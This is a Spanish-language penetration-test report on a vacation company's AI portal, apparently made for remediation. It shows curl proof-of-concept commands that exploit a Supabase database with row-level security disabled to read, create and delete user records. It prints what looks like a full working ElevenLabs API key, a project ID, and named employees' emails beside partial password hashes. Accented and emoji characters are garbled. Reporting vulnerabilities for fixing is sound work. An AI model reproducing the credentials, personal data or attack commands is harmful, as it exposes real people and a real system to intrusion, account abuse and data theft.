# üî¥ REPORTE DE PENTESTING EXTERNO

**Dominio:** ai.vidavacations.com  
**Fecha:** 16 de Enero 2026  
**Tipo:** Caja Negra (sin conocimiento interno)  
**Severidad General:** üî¥ CR√çTICA

---

## üìä Resumen Ejecutivo

Un atacante externo **sin credenciales previas** puede:

| Acci√≥n | Demostrado |
|--------|------------|
| Leer emails y password_hash de 140 usuarios | ‚úÖ S√≠ |
| Crear usuarios nuevos en la base de datos | ‚úÖ S√≠ (cre√© hacker@test.com) |
| Eliminar usuarios existentes | ‚úÖ S√≠ (elimin√© el usuario creado) |
| Extraer 18 API tokens/credenciales | ‚úÖ S√≠ |
| Usar la API de ElevenLabs (6M caracteres) | ‚úÖ S√≠ - API Key funcional |
| Acceder a informaci√≥n de webhooks N8N | ‚úÖ S√≠ |

---

## üîç Metodolog√≠a

### Fase 1: Reconocimiento Pasivo
- DNS Lookup: 4 IPs de CloudFront (13.226.15.x)
- WHOIS: Dominio registrado v√≠a Domains By Proxy (privacidad)
- Registros DNS: NS en DomainControl.com

### Fase 2: Fingerprinting
- **Servidor:** Amazon S3 + CloudFront
- **CDN:** CloudFront POP QRO51-P6 (M√©xico)
- **SSL:** TLSv1.3, certificado Amazon v√°lido hasta Dec 2026

### Fase 3: Enumeraci√≥n
- SPA detectada (todas las rutas devuelven index.html)
- Bundle JavaScript de 8.7 MB

### Fase 4: An√°lisis de Bundle
- 3 URLs de Supabase detectadas
- 6 tokens JWT encontrados (todos anon_key)

### Fase 5-10: Explotaci√≥n
- Acceso a base de datos v√≠a anon_key
- CRUD completo en tablas sin RLS

---

## üö® Vulnerabilidades Cr√≠ticas

### VULN-001: RLS Deshabilitado en Supabase [CVSS 9.8]

**Descripci√≥n:** Row Level Security est√° deshabilitado en las 61 tablas del proyecto Supabase (glsmifhkoaifvaegsozd). Esto permite que cualquier request con `anon_key` tenga acceso completo de lectura y escritura.

**Prueba de Concepto:**

```bash
# Extraer anon_key del bundle
anon_key=$(grep -oE "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" bundle.js | head -1)

# Leer usuarios con password hash
curl "https://glsmifhkoaifvaegsozd.supabase.co/rest/v1/auth_users?select=email,password_hash" \
  -H "apikey: $anon_key" -H "Authorization: Bearer $anon_key"

# Crear usuario malicioso
curl -X POST "https://glsmifhkoaifvaegsozd.supabase.co/rest/v1/auth_users" \
  -H "apikey: $anon_key" -H "Authorization: Bearer $anon_key" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@evil.com","password_hash":"$2a$12$xxx","is_active":true}'
```

**Impacto:**
- Acceso a 140 cuentas de usuario
- Posibilidad de crear usuarios administradores
- Eliminaci√≥n de datos de producci√≥n

---

### VULN-002: Credenciales de Terceros Expuestas [CVSS 9.1]

**Descripci√≥n:** La tabla `api_auth_tokens` contiene credenciales de servicios externos, accesibles sin autenticaci√≥n.

**Credenciales Expuestas:**

| Servicio | Tipo | Impacto |
|----------|------|---------|
| ElevenLabs | API Key (sk_9f6a9d41...) | 6M caracteres disponibles |
| N8N | 2 JWT tokens | Acceso a workflows |
| Dynamics | Token de 128 chars | Acceso a CRM |
| WhatsApp Webhooks | 4 auth tokens | Env√≠o de mensajes |

**Prueba de Concepto:**

```bash
# Verificar ElevenLabs key funciona
curl "https://api.elevenlabs.io/v1/user" \
  -H "xi-api-key: sk_9f6a9d41ceeca6766de6fb27a9b8b1ddd678b1f738db6d65"

# Respuesta: {"user_id":"6Iluf3xjPDc1sYPPxHU9a7Uqdfy1","subscription":{"tier":"growing_business"...}}
```

---

### VULN-003: Password Hashes Expuestos [CVSS 8.6]

**Descripci√≥n:** Los hashes bcrypt de las contrase√±as de todos los usuarios est√°n expuestos en `auth_users.password_hash`.

**Muestra de datos obtenidos:**

```
leonardoirak@grupovidanta.com ‚Üí $2a$12$vhHyPr320q0XUkTFkdych...
ejecutivo@grupovidanta.com ‚Üí $2a$06$ptnlhcNvUFVbjjslUbK5...
oscarhernandez@vidavacations.com ‚Üí $2a$10$JHLf5dPmSVeM60NiXZGdh...
```

**Impacto:**
- Ataque offline de fuerza bruta
- Cracking con hashcat/John the Ripper
- Posible reutilizaci√≥n de contrase√±as en otros servicios

---

### VULN-004: Escritura No Autorizada [CVSS 8.1]

**Descripci√≥n:** Sin RLS, es posible INSERT/UPDATE/DELETE en cualquier tabla.

**Prueba de Concepto:**

```bash
# Crear usuario
curl -X POST ".../rest/v1/auth_users" -d '{"email":"hacker@test.com"...}'
# Resultado: Usuario creado con ID 36ba9a0b-c6b2-4312-a074-2e1039627839

# Eliminar usuario
curl -X DELETE ".../rest/v1/auth_users?email=eq.hacker@test.com"
# Resultado: Usuario eliminado exitosamente
```

---

## ‚úÖ Aspectos Positivos

| Control | Estado |
|---------|--------|
| service_role_key en bundle | ‚úÖ No expuesta |
| SSL/TLS | ‚úÖ TLSv1.3 configurado |
| HSTS | ‚úÖ max-age=31536000 |
| X-Frame-Options | ‚úÖ SAMEORIGIN |
| X-Content-Type-Options | ‚úÖ nosniff |
| Certificado SSL | ‚úÖ V√°lido (Amazon) |
| AWS Access Keys | ‚úÖ No expuestas |
| Webhooks N8N | ‚úÖ Requieren auth |

---

## üõ†Ô∏è Recomendaciones

### Inmediato (24-48 horas)

1. **Habilitar RLS en todas las tablas p√∫blicas**

```sql
ALTER TABLE auth_users ENABLE ROW LEVEL SECURITY;
ALTER TABLE api_auth_tokens ENABLE ROW LEVEL SECURITY;
ALTER TABLE auth_sessions ENABLE ROW LEVEL SECURITY;
-- Repetir para las 61 tablas
```

2. **Crear pol√≠ticas RLS restrictivas**

```sql
-- auth_users: Solo lectura del propio usuario
CREATE POLICY "users_read_own" ON auth_users
  FOR SELECT USING (id = auth.uid());

-- api_auth_tokens: Solo acceso via service_role (Edge Functions)
CREATE POLICY "tokens_service_only" ON api_auth_tokens
  FOR ALL USING (false);
```

3. **Rotar TODAS las credenciales expuestas**
   - ElevenLabs API Key
   - N8N API Keys (2)
   - Dynamics Token
   - WhatsApp auth tokens (4)

4. **Ocultar password_hash del frontend**

```sql
-- Crear vista sin password_hash
CREATE VIEW auth_users_public AS
SELECT id, email, full_name, is_active, role_id
FROM auth_users;
```

### Medio Plazo (1-2 semanas)

5. **Mover api_auth_tokens a Supabase Vault o Edge Functions**
   - Los tokens de terceros nunca deben estar en tablas p√∫blicas

6. **Implementar Content-Security-Policy**

7. **Auditar todas las tablas** para determinar qu√© datos deben ser p√∫blicos

---

## üìã Notas del Pentester

- **No se realizaron ataques destructivos** m√°s all√° de la prueba de creaci√≥n/eliminaci√≥n de usuario de prueba
- El usuario de prueba (hacker@test.com) fue eliminado inmediatamente
- No se exfiltraron datos m√°s all√° de lo necesario para la prueba de concepto
- Todas las credenciales expuestas deben considerarse comprometidas

---

**Reporte generado:** 16 de Enero 2026, 12:00:00  
**Metodolog√≠a:** OWASP Testing Guide v4.2, PTES  
**Herramientas:** curl, grep, base64, openssl
